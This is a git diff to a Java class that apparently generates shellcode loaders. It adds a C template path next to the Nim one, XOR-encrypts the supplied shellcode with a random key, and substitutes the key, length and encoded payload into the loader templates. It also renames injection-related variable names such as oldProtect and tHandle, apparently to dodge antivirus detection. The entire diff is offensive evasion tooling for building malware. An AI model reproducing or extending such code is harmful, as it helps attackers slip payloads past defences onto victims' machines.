@@ -26,8 +26,13 @@ public class TextFileProcessor {
     }
     public static String processTemplate(String code, String selectedTemplate) throws IOException {
         String processedCode = readTemplateFromFile(selectedTemplate);
-        if (selectedTemplate.endsWith("nim")) {
-            processedCode = processNimTemplate(code, processedCode);
+        String fileName = selectedTemplate.substring(selectedTemplate.lastIndexOf(".") + 1);
+
+        switch (fileName) {
+            case "nim" -> processedCode = processNimTemplate(code, processedCode);
+            case "c" -> processedCode = processCTemplate(code, processedCode);
+            default -> {
+            }
         }
 
         List<String> variableNamesToReplace = Arrays.asList("calc_payload", "calc_len", "calc", "rv", "th", "oldProtect", "tId", "rPtr", "wSuccess", "tHandle");
@@ -42,6 +47,15 @@ public class TextFileProcessor {
         code = TextFileProcessor.convertToHexStringWithPrefix(xorEncrypt(convertHexStringToByteArray(code), key));
         return processedCode.replace(TEMPLATE_ICON_PLACEHOLDER, randomICON)
                 .replace(TEMPLATE_KEY_PLACEHOLDER, convertToHexStringWithPrefix(key))
+                .replace(TEMPLATE_LEN_PLACEHOLDER, String.valueOf(countCommas(code) + 1))
+                .replace(TEMPLATE_SHELLCODE_PLACEHOLDER, code);
+    }
+
+    private static String processCTemplate(String code, String processedCode) {
+        byte[] key = generateRandomString(8).getBytes();
+        String randomICON = FileProcessor.getRandomFileName();
+        code = TextFileProcessor.convertToHexStringWithPrefix(xorEncrypt(convertHexStringToByteArray(code), key));
+        return processedCode.replace(TEMPLATE_KEY_PLACEHOLDER, convertToHexStringWithPrefix(key))
                 .replace(TEMPLATE_LEN_PLACEHOLDER, String.valueOf(countCommas(code) + 1))
                 .replace(TEMPLATE_SHELLCODE_PLACEHOLDER, code);
     }
